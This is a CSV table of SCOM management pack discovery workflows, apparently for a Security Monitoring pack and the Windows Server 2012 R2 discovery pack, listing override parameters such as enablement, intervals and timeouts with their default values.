ManagementPackId,WorkflowId,WorkflowType,DisplayName,Description,OverrideParameterName,OverrideParameterType,DefaultValue,Balanced,Essentials,Notes
Security.Monitoring,Security.Monitoring.AdminAccountDiscovery,Discovery,Security Monitoring: Discover Admin Accounts,"This discovery, once enabled will discover all admin accounts. NOTE: Enable for only one machine and enable on a machine that has the AD PowerShell Module installed.",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.AdminAccountDiscovery,Discovery,Security Monitoring: Discover Admin Accounts,"This discovery, once enabled will discover all admin accounts. NOTE: Enable for only one machine and enable on a machine that has the AD PowerShell Module installed.",IntervalSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.AdminAccountDiscovery,Discovery,Security Monitoring: Discover Admin Accounts,"This discovery, once enabled will discover all admin accounts. NOTE: Enable for only one machine and enable on a machine that has the AD PowerShell Module installed.",TimeoutSeconds,int,300,300,300,
Security.Monitoring,Security.Monitoring.AdminAccountDiscovery,Discovery,Security Monitoring: Discover Admin Accounts,"This discovery, once enabled will discover all admin accounts. NOTE: Enable for only one machine and enable on a machine that has the AD PowerShell Module installed.",SyncTime,string,,,,
Security.Monitoring,Security.Monitoring.DA.DCDiscovery,Discovery,Security Monitoring: Distributed App DC Discovery,Populates Security Monitoring Distributed Application,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.DA.DCDiscovery,Discovery,Security Monitoring: Distributed App DC Discovery,Populates Security Monitoring Distributed Application,IntervalSeconds,int,300,300,300,
Security.Monitoring,Security.Monitoring.Discoveries.UserWriteableLocationSeed,Discovery,Security Monitoring: User Writeable Directories Seed Class,"If reg key to discover user writeable locations on a server is populated, this discovery will initiate the seed discovery",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Discoveries.UserWriteableLocationSeed,Discovery,Security Monitoring: User Writeable Directories Seed Class,"If reg key to discover user writeable locations on a server is populated, this discovery will initiate the seed discovery",Frequency,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.DiscoverWriteableFileLocations,Discovery,Security Monitoring: Discover Writeable File Locations,This will discover writeable file locations in windows or program files,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.DiscoverWriteableFileLocations,Discovery,Security Monitoring: Discover Writeable File Locations,This will discover writeable file locations in windows or program files,AdditionalLocations,string,,,,
Security.Monitoring,Security.Monitoring.DiscoverWriteableFileLocations,Discovery,Security Monitoring: Discover Writeable File Locations,This will discover writeable file locations in windows or program files,FrequencyInSeconds,int,86400,86400,86400,
Security.Monitoring,Security.Monitoring.DiscoverWriteableFileLocations,Discovery,Security Monitoring: Discover Writeable File Locations,This will discover writeable file locations in windows or program files,TimeOutSeconds,int,600,600,600,
Security.Monitoring,Security.Monitoring.PopulateExtendedWriteableDirectoryComputerGroup,Discovery,Security Monitoring: Populate Extended Writeable Directory Monitoring Group,This discovery will put the windows computer objects in a group that can be used for overrides.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.DA.MSDiscovery,Discovery,Security Monitoring: Distributed App MemberServer Discovery,Populates Security Monitoring Distributed Application,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.DA.MSDiscovery,Discovery,Security Monitoring: Distributed App MemberServer Discovery,Populates Security Monitoring Distributed Application,IntervalSeconds,int,300,300,300,
Microsoft.Windows.Server.2012.R2.Discovery,Microsoft.Windows.Server.2012.R2.Full.AllServersComputerGroupDiscovery,Discovery,Populate All Windows Server 2012 R2 Full Computer Group,This rule populates the Windows Server 2012 R2 Full Computer Group.,Enabled,bool,TRUE,TRUE,TRUE,
Microsoft.Windows.Server.2012.R2.Discovery,Microsoft.Windows.Server.2012.R2.Computer.Discovery,Discovery,Discover Windows 2012 R2 Servers,This rule discovers Windows 2012 R2 Servers,Enabled,bool,TRUE,TRUE,TRUE,
Microsoft.Windows.Server.2012.R2.Discovery,Microsoft.Windows.Server.2012.R2.Computer.Discovery,Discovery,Discover Windows 2012 R2 Servers,This rule discovers Windows 2012 R2 Servers,IntervalSeconds,int,86400,86400,86400,
Microsoft.Windows.Server.2012.R2.Discovery,Microsoft.Windows.Server.2012.R2.Computer.Discovery,Discovery,Discover Windows 2012 R2 Servers,This rule discovers Windows 2012 R2 Servers,TimeoutSeconds,int,360,360,360,
Microsoft.Windows.Server.2012.R2.Discovery,Microsoft.Windows.Server.2012.R2.AllServersComputerGroupDiscovery,Discovery,Populate All Windows Server 2012 R2 Computer Group,This rule populates the Windows Server 2012 R2 Computer Group.,Enabled,bool,TRUE,TRUE,TRUE,
Microsoft.Windows.Server.2012.R2.Discovery,Microsoft.Windows.Server.2012.R2.Core.AllServersComputerGroupDiscovery,Discovery,Populate All Windows Server 2012 R2 Core Computer Group,This rule populates the Windows Server 2012 R2 Core Computer Group.,Enabled,bool,TRUE,TRUE,TRUE,
Microsoft.Windows.Server.2012.R2.Discovery,Microsoft.Windows.Server.2012.R2.StandardLicense.Discovery,Discovery,License Discovery for Microsoft Windows Server,"This discovery rule discovers and populates the class named “System Center Operations Manager Standard License""",Enabled,bool,TRUE,TRUE,TRUE,
